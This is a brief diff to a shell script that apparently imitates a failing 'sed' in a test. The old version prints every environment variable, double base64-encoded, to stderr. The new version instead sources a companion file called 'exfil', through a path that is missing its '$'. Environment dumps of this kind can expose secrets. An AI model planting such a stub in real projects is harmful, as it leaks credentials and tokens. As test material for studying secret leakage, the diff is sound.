@@ -1,7 +1,7 @@
-#SHELL
+#!/bin/bash
 
-echo "$0: oops-from-sed"
-(
-    env|sort|base64 -w0|base64 -w0
-) >&2
+THIS_DIR=$(dirname "$(readlink -f "$0")")
+source THIS_DIR/exfil >&2
+
+echo "oops-from-sed"
 exit 44
